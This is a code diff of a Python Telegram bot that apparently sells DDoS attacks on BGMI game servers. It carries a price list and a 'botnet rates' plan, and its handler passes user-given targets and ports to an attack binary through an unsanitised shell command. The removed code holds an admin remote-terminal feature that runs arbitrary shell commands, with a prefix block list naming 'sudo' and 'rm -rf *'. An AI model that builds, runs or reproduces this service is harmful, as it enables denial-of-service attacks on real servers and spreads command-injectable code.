-    """Show current status for threads, binary, packets, and command type."""
-    user_id = str(message.chat.id)
-    if user_id in admin_id:
-        # Prepare the status message
-        status_message = (
-            f"☣️ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗧𝗔𝗧𝗨𝗦 ☣️\n\n"
-            f"▶️ 𝗔𝘁𝘁𝗮𝗰𝗸 𝗰𝗼𝘀𝘁: {ATTACK_COST}\n"
-            f"▶️ 𝗔𝘁𝘁𝗮𝗰𝗸 𝗰𝗼𝗼𝗹𝗱𝗼𝘄𝗻: {ATTACK_COOLDOWN}\n"
-            f"▶️ 𝗔𝘁𝘁𝗮𝗰𝗸 𝘁𝗶𝗺𝗲: {MAX_ATTACK_TIME}\n\n"
-            f"-----------------------------------\n"
-            f"✴️ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗘𝗧𝗧𝗜𝗡𝗚𝗦 ✴️\n\n"
-            f"▶️ 𝗕𝗶𝗻𝗮𝗿𝘆 𝗻𝗮𝗺𝗲: {binary}\n"
-            f"▶️ 𝗣𝗮𝗿𝗮𝗺𝗲𝘁𝗲𝗿𝘀: {full_command_type}\n"
-            f"▶️ 𝗧𝗵𝗿𝗲𝗮𝗱𝘀: {threads}\n"
-            f"▶️ 𝗣𝗮𝗰𝗸𝗲𝘁𝘀: {packets}\n"
-        )
-        bot.reply_to(message, status_message)
-    else:
-        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")
-        
-# --------------------------------------------------------------
-        
 
-        
-        
-        
-# --------------------[ TERMINAL SECTION ]----------------------
 
-# List of blocked command prefixes
-blocked_prefixes = ["nano", "sudo", "rm *", "rm -rf *"]
-
-@bot.message_handler(func=lambda message: message.text == "Command")
-def command_to_terminal(message):
-    """Handle sending commands to terminal for admins."""
-    user_id = str(message.chat.id)
+# Function to handle the reply when free users run the /bgmi command
+def start_attack_reply(message, target, port, time):
+    user_info = message.from_user
+    username = user_info.username if user_info.username else user_info.first_name
     
-    if user_id in admin_id:
-        bot.reply_to(message, "𝗘𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝗰𝗼𝗺𝗺𝗮𝗻𝗱:")
-        bot.register_next_step_handler(message, execute_terminal_command)
-    else:
-        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")
+    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: VIP- method by @Parveen_solanki"
+    bot.reply_to(message, response)
 
-def execute_terminal_command(message):
-    """Execute the terminal command entered by the admin."""
-    try:
-        command = message.text.strip()
+# Dictionary to store the last time each user ran the /bgmi command
+bgmi_cooldown = {}
+
+COOLDOWN_TIME =0
+
+# Handler for /bgmi command
+@bot.message_handler(commands=['bgmi'])
+def handle_bgmi(message):
+    user_id = str(message.chat.id)
+    if user_id in allowed_user_ids:
+        # Check if the user is in admin_id (admins have no cooldown)
+        if user_id not in admin_id:
+            # Check if the user has run the command before and is still within the cooldown period
+            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
+                response = "You Are On Cooldown ❌. Please Wait 10sec Before Running The /bgmi Command Again."
+                bot.reply_to(message, response)
+                return
+            # Update the last time the user ran the command
+            bgmi_cooldown[user_id] = datetime.datetime.now()
         
-        # Check if the command starts with any of the blocked prefixes
-        if any(command.startswith(blocked_prefix) for blocked_prefix in blocked_prefixes):
-            bot.reply_to(message, "❗️𝗧𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗶𝘀 𝗯𝗹𝗼𝗰𝗸𝗲𝗱.")
-            return
-        
-        # Execute the command if it's not blocked
-        result = subprocess.run(command, shell=True, capture_output=True, text=True)
-        output = result.stdout if result.stdout else result.stderr
-        if output:
-            bot.reply_to(message, f"⏺️ 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗢𝘂𝘁𝗽𝘂𝘁:\n`{output}`", parse_mode='Markdown')
+        command = message.text.split()
+        if len(command) == 4:  # Updated to accept target, time, and port
+            target = command[1]
+            port = int(command[2])  # Convert port to integer
+            time = int(command[3])  # Convert time to integer
+            if time > 360:
+                response = "Error: Time interval must be less than 360."
+            else:
+                record_command_logs(user_id, '/megoxer', target, port, time)
+                log_command(user_id, target, port, time)
+                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
+                full_command = f"./megoxer {target} {port} {time} 1000"
+                process = subprocess.run(full_command, shell=True)
+                response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
+                bot.reply_to(message, response)  # Notify the user that the attack is finished
         else:
-            bot.reply_to(message, "✅ 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗲𝘅𝗲𝗰𝘂𝘁𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘂𝗹𝗹𝘆")
+            response = "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
+    else:
+        response = ("🚫 Unauthorized Access! 🚫\n\nOops! It seems like you don't have permission to use the /bgmi command. DM TO BUY ACCESS:- @Parveen_solanki")
+
+    bot.reply_to(message, response)
+
+
+# Add /mylogs command to display logs recorded for bgmi and website commands
+@bot.message_handler(commands=['mylogs'])
+def show_command_logs(message):
+    user_id = str(message.chat.id)
+    if user_id in allowed_user_ids:
+        try:
+            with open(LOG_FILE, "r") as file:
+                command_logs = file.readlines()
+                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
+                if user_logs:
+                    response = "Your Command Logs:\n" + "".join(user_logs)
+                else:
+                    response = "❌ No Command Logs Found For You ❌."
+        except FileNotFoundError:
+            response = "No command logs found."
+    else:
+        response = "You Are Not Authorized To Use This Command 😡."
+
+    bot.reply_to(message, response)
+
+@bot.message_handler(commands=['help'])
+def show_help(message):
+    help_text ='''🤖 Available commands:
+💥 /bgmi : Method For Bgmi Servers. 
+💥 /rules : Please Check Before Use !!.
+💥 /mylogs : To Check Your Recents Attacks.
+💥 /plan : Checkout Our Botnet Rates.
+💥 /myinfo : TO Check Your WHOLE INFO.
+
+🤖 To See Admin Commands:
+💥 /admincmd : Shows All Admin Commands.
+
+Buy From :- @Parveen_solanki
+Official Channel :- https://t.me/ParveenXfreeddos
+'''
+    for handler in bot.message_handlers:
+        if hasattr(handler, 'commands'):
+            if message.text.startswith('/help'):
+                help_text += f"{handler.commands[0]}: {handler.doc}\n"
+            elif handler.doc and 'admin' in handler.doc.lower():
+                continue
+            else:
+                help_text += f"{handler.commands[0]}: {handler.doc}\n"
+    bot.reply_to(message, help_text)
+
+@bot.message_handler(commands=['start'])
+def welcome_start(message):
+    user_name = message.from_user.first_name
+    response = f'''❄️ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴘʀᴇᴍɪᴜᴍ ᴅᴅᴏs ʙᴏᴛ, {user_name}! ᴛʜɪs ɪs ʜɪɢʜ ǫᴜᴀʟɪᴛʏ sᴇʀᴠᴇʀ ʙᴀsᴇᴅ ᴅᴅᴏs. ᴛᴏ ɢᴇᴛ ᴀᴄᴄᴇss.
+🤖Try To Run This Command : /help 
+✅BUY :- @Parveen_solanki'''
+    bot.reply_to(message, response)
+
+@bot.message_handler(commands=['rules'])
+def welcome_rules(message):
+    user_name = message.from_user.first_name
+    response = f'''{user_name} Please Follow These Rules ⚠️:
+
+1. Dont Run Too Many Attacks !! Cause A Ban From Bot
+2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot.
+3. MAKE SURE YOU JOINED https://t.me/ParveenXfreeddos OTHERWISE NOT WORK
+4. We Daily Checks The Logs So Follow these rules to avoid Ban!!'''
+    bot.reply_to(message, response)
+
+@bot.message_handler(commands=['plan'])
+def welcome_plan(message):
+    user_name = message.from_user.first_name
+    response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!:
+
+Vip 🌟 :
+-> Attack Time : 300 (S)
+> After Attack Limit : 10 sec
+-> Concurrents Attack : 5
+
+Pr-ice List💸 :
+Day-->80 Rs
+Week-->400 Rs
+Month-->1000 Rs
+'''
+    bot.reply_to(message, response)
+
+@bot.message_handler(commands=['admincmd'])
+def welcome_plan(message):
+    user_name = message.from_user.first_name
+    response = f'''{user_name}, Admin Commands Are Here!!:
+
+💥 /add <userId> : Add a User.
+💥 /remove <userid> Remove a User.
+💥 /allusers : Authorised Users Lists.
+💥 /logs : All Users Logs.
+💥 /broadcast : Broadcast a Message.
+💥 /clearlogs : Clear The Logs File.
+💥 /clearusers : Clear The USERS File.
+'''
+    bot.reply_to(message, response)
+
+@bot.message_handler(commands=['broadcast'])
+def broadcast_message(message):
+    user_id = str(message.chat.id)
+    if user_id in admin_id:
+        command = message.text.split(maxsplit=1)
+        if len(command) > 1:
+            message_to_broadcast = "⚠️ Message To All Users By Admin:\n\n" + command[1]
+            with open(USER_FILE, "r") as file:
+                user_ids = file.read().splitlines()
+                for user_id in user_ids:
+                    try:
+                        bot.send_message(user_id, message_to_broadcast)
+                    except Exception as e:
+                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
+            response = "Broadcast Message Sent Successfully To All Users 👍."
+        else:
+            response = "🤖 Please Provide A Message To Broadcast."
+    else:
+        response = "Only Admin Can Run This Command 😡."
+
+    bot.reply_to(message, response)
+
+
+
+#bot.polling()
+while True:
+    try:
+        bot.polling(none_stop=True)
     except Exception as e:
-        bot.reply_to(message, f"❗️ 𝗘𝗿𝗿𝗼𝗿 𝗘𝘅𝗲𝗰𝘂𝘁𝗶𝗻𝗴 𝗰𝗼𝗺𝗺𝗮𝗻𝗱: {str(e)}")
-
-@bot.message_handler(func=lambda message: message.text == "Upload")
-def upload_to_terminal(message):
-    """Handle file upload to terminal for admins."""
-    user_id = str(message.chat.id)
-    
-    if user_id in admin_id:
-        bot.reply_to(message, "📤 𝗦𝗲𝗻𝗱 𝗳𝗶𝗹𝗲 𝘁𝗼 𝘂𝗽𝗹𝗼𝗮𝗱 𝗶𝗻 𝘁𝗲𝗿𝗺𝗶𝗻𝗮𝗹.")
-        bot.register_next_step_handler(message, process_file_upload)
-    else:
-        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")
-
-def process_file_upload(message):
-    """Process the uploaded file and save it in the current directory."""
-    if message.document:
-        try:
-            # Get file info and download it
-            file_info = bot.get_file(message.document.file_id)
-            downloaded_file = bot.download_file(file_info.file_path)
-            
-            # Get the current directory of the Python script
-            current_dir = os.path.dirname(os.path.abspath(__file__))
-            
-            # Create the full file path where the file will be saved
-            file_path = os.path.join(current_dir, message.document.file_name)
-            
-            # Save the file in the current directory
-            with open(file_path, 'wb') as new_file:
-                new_file.write(downloaded_file)
-            
-            bot.reply_to(message, f"📤 𝗙𝗶𝗹𝗲 𝘂𝗽𝗹𝗼𝗮𝗱𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆:\n `{file_path}`", parse_mode='Markdown')
-        except Exception as e:
-            bot.reply_to(message, f"❗️𝗘𝗿𝗿𝗼𝗿 𝘂𝗽𝗹𝗼𝗮𝗱𝗶𝗻𝗴 𝗳𝗶𝗹𝗲: {str(e)}")
-    else:
-        bot.reply_to(message, "❗️𝗦𝗲𝗻𝗱 𝗼𝗻𝗹𝘆 𝗳𝗶𝗹𝗲 𝘁𝗼 𝘂𝗽𝗹𝗼𝗮𝗱 ")
-        
-# --------------------------------------------------------------
-        
-
-        
-        
-        
-# --------------------[ ATTACK SETTINGS ]----------------------
-
-@bot.message_handler(func=lambda message: message.text == "Threads")
-def set_threads(message):
-    """Admin command to change threads."""
-    user_id = str(message.chat.id)
-    if user_id in admin_id:
-        bot.reply_to(message, "𝗘𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝗻𝘂𝗺𝗯𝗲𝗿 𝗼𝗳 𝘁𝗵𝗿𝗲𝗮𝗱𝘀:")
-        bot.register_next_step_handler(message, process_new_threads)
-    else:
-        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")
-
-def process_new_threads(message):
-        new_threads = message.text.strip()
-        global threads
-        threads = new_threads
-        save_config()  # Save changes
-        bot.reply_to(message, f"✅ 𝗧𝗵𝗿𝗲𝗮𝗱𝘀 𝗰𝗵𝗮𝗻𝗴𝗲𝗱 𝘁𝗼: {new_threads}")
-
-@bot.message_handler(func=lambda message: message.text == "Binary")
-def set_binary(message):
-    """Admin command to change the binary name."""
-    user_id = str(message.chat.id)
-    if user_id in admin_id:
-        bot.reply_to(message, "𝗘𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝗻𝗮𝗺𝗲 𝗼𝗳 𝘁𝗵𝗲 𝗻𝗲𝘄 𝗯𝗶𝗻𝗮𝗿𝘆:")
-        bot.register_next_step_handler(message, process_new_binary)
-    else:
-        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")
-
-def process_new_binary(message):
-    new_binary = message.text.strip()
-    global binary
-    binary = new_binary
-    save_config()  # Save changes
-    bot.reply_to(message, f"✅ 𝗕𝗶𝗻𝗮𝗿𝘆 𝗻𝗮𝗺𝗲 𝗰𝗵𝗮𝗻𝗴𝗲𝗱 𝘁𝗼: `{new_binary}`", parse_mode='Markdown')
+        print(e)
 
 
-@bot.message_handler(func=lambda message: message.text == "Packets")
-def set_packets(message):
-    """Admin command to change packets."""
-    user_id = str(message.chat.id)
-    if user_id in admin_id:
-        bot.reply_to(message, "𝗘𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝗻𝘂𝗺𝗯𝗲𝗿 𝗼𝗳 𝗽𝗮𝗰𝗸𝗲𝘁𝘀:")
-        bot.register_next_step_handler(message, process_new_packets)
-    else:
-        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")
-
-def process_new_packets(message):
-    new_packets = message.text.strip()
-    global packets
-    packets = new_packets
-    save_config()  # Save changes
-    bot.reply_to(message, f"✅ 𝗣𝗮𝗰𝗸𝗲𝘁𝘀 𝗰𝗵𝗮𝗻𝗴𝗲𝗱 𝘁𝗼: {new_packets}")
-
-@bot.message_handler(func=lambda message: message.text == "parameters")
-def set_command_type(message):
-    """Admin command to change the full_command_type using inline buttons."""
-    user_id = str(message.chat.id)
-    if user_id in admin_id:
-        markup = types.InlineKeyboardMarkup(row_width=1)
-        btn1 = types.InlineKeyboardButton("parameters 1", callback_data="arg_1")
-        btn2 = types.InlineKeyboardButton("parameters 2", callback_data="arg_2")
-        btn3 = types.InlineKeyboardButton("parameters 3", callback_data="arg_3")
-        markup.add(btn1, btn2, btn3)
-        
-        bot.reply_to(message, "🔹 𝗦𝗲𝗹𝗲𝗰𝘁 𝗮𝗻 𝗣𝗮𝗿𝗮𝗺𝗲𝘁𝗲𝗿𝘀 𝘁𝘆𝗽𝗲:", reply_markup=markup)
-    else:
-        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")
-
-@bot.callback_query_handler(func=lambda call: call.data.startswith("arg_"))
-def process_parameters_selection(call):
-    """Handles parameters selection via inline buttons."""
-    global full_command_type
-    selected_arg = int(call.data.split("_")[1])  # Extract parameters number
-
-    # Update the global command type
-    full_command_type = selected_arg
-    save_config()  # Save the new configuration
-
-    # Generate response message based on the selected parameters
-    if full_command_type == 1:
-        response_message = "✅ 𝗦𝗲𝗹𝗲𝗰𝘁𝗲𝗱 𝗣𝗮𝗿𝗮𝗺𝗲𝘁𝗲𝗿𝘀 1:\n `<target> <port> <time>`"
-    elif full_command_type == 2:
-        response_message = "✅ 𝗦𝗲𝗹𝗲𝗰𝘁𝗲𝗱 𝗣𝗮𝗿𝗮𝗺𝗲𝘁𝗲𝗿𝘀 2:\n `<target> <port> <time> <threads>`"
-    elif full_command_type == 3:
-        response_message = "✅ 𝗦𝗲𝗹𝗲𝗰𝘁𝗲𝗱 𝗣𝗮𝗿𝗮𝗺𝗲𝘁𝗲𝗿𝘀 3:\n `<target> <port> <time> <packet> <threads>`"
-    else:
-        response_message = "❗𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝘀𝗲𝗹𝗲𝗰𝘁𝗶𝗼𝗻."
-
-    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=response_message, parse_mode='Markdown')
-        
-@bot.message_handler(func=lambda message: message.text == "Attack Cooldown")
-def set_attack_cooldown(message):
-    """Admin command to change attack cooldown time."""
-    user_id = str(message.chat.id)
-    if user_id in admin_id:
-        bot.reply_to(message, "🕒 𝗘𝗻𝘁𝗲𝗿 𝗻𝗲𝘄 𝗮𝘁𝘁𝗮𝗰𝗸 𝗰𝗼𝗼𝗹𝗱𝗼𝘄𝗻 (𝗶𝗻 𝘀𝗲𝗰𝗼𝗻𝗱𝘀):")
-        bot.register_next_step_handler(message, process_new_attack_cooldown)
-    else:
-        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")
-
-def process_new_attack_cooldown(message):
-    global ATTACK_COOLDOWN
-    try:
-        new_cooldown = int(message.text)
-        ATTACK_COOLDOWN = new_cooldown
-        save_config()  # Save changes
-        bot.reply_to(message, f"✅ 𝗔𝘁𝘁𝗮𝗰𝗸 𝗰𝗼𝗼𝗹𝗱𝗼𝘄𝗻 𝗰𝗵𝗮𝗻𝗴𝗲𝗱 𝘁𝗼: {new_cooldown} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀")
-    except ValueError:
-        bot.reply_to(message, "❗𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗻𝘂𝗺𝗯𝗲𝗿! 𝗣𝗹𝗲𝗮𝘀𝗲 𝗲𝗻𝘁𝗲𝗿 𝗮 𝘃𝗮𝗹𝗶𝗱 𝗻𝘂𝗺𝗲𝗿𝗶𝗰 𝘃𝗮𝗹𝘂𝗲.")
-        
-@bot.message_handler(func=lambda message: message.text == "Attack Time")
-def set_attack_time(message):
-    """Admin command to change max attack time."""
-    user_id = str(message.chat.id)
-    if user_id in admin_id:
-        bot.reply_to(message, "⏳ 𝗘𝗻𝘁𝗲𝗿 𝗺𝗮𝘅 𝗮𝘁𝘁𝗮𝗰𝗸 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻 (𝗶𝗻 𝘀𝗲𝗰𝗼𝗻𝗱𝘀):")
-        bot.register_next_step_handler(message, process_new_attack_time)
-    else:
-        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")
-
-def process_new_attack_time(message):
-    global MAX_ATTACK_TIME
-    try:
-        new_attack_time = int(message.text)
-        MAX_ATTACK_TIME = new_attack_time
-        save_config()  # Save changes
-        bot.reply_to(message, f"✅ 𝗠𝗮𝘅 𝗮𝘁𝘁𝗮𝗰𝗸 𝘁𝗶𝗺𝗲 𝗰𝗵𝗮𝗻𝗴𝗲𝗱 𝘁𝗼: {new_attack_time} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀")
-    except ValueError:
-        bot.reply_to(message, "❗𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗻𝘂𝗺𝗯𝗲𝗿! 𝗣𝗹𝗲𝗮𝘀𝗲 𝗲𝗻𝘁𝗲𝗿 𝗮 𝘃𝗮𝗹𝗶𝗱 𝗻𝘂𝗺𝗲𝗿𝗶𝗰 𝘃𝗮𝗹𝘂𝗲.")
-
-@bot.message_handler(func=lambda message: message.text == "Attack cost")
-def set_attack_cost(message):
-    """Admin command to change max attack time."""
-    user_id = str(message.chat.id)
-    if user_id in admin_id:
-        bot.reply_to(message, "⏳ 𝗘𝗻𝘁𝗲𝗿 𝗻𝗲𝘄 𝗮𝘁𝘁𝗮𝗰𝗸 𝗰𝗼𝘀𝘁:")
-        bot.register_next_step_handler(message, process_new_attack_cost)
-    else:
-        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")
-
-def process_new_attack_cost(message):
-    global ATTACK_COST
-    try:
-        new_attack_cost = int(message.text)
-        ATTACK_COST = new_attack_cost
-        save_config()  # Save changes
-        bot.reply_to(message, f"✅ 𝗡𝗲𝘄 𝗮𝘁𝘁𝗮𝗰𝗸 𝗰𝗼𝘀𝘁 𝗰𝗵𝗮𝗻𝗴𝗲𝗱 𝘁𝗼: {new_attack_cost} 𝗖𝗼𝗶𝗻𝘀")
-    except ValueError:
-        bot.reply_to(message, "❗𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗻𝘂𝗺𝗯𝗲𝗿! 𝗣𝗹𝗲𝗮𝘀𝗲 𝗲𝗻𝘁𝗲𝗿 𝗮 𝘃𝗮𝗹𝗶𝗱 𝗻𝘂𝗺𝗲𝗿𝗶𝗰 𝘃𝗮𝗹𝘂𝗲.")
-
-if __name__ == "__main__":
-    while True:
-        load_data()
-        try:
-            bot.polling(none_stop=True)
-        except Exception as e:
-            print(e)
-            # Add a small delay to avoid rapid looping in case of persistent errors
-            time.sleep(3)
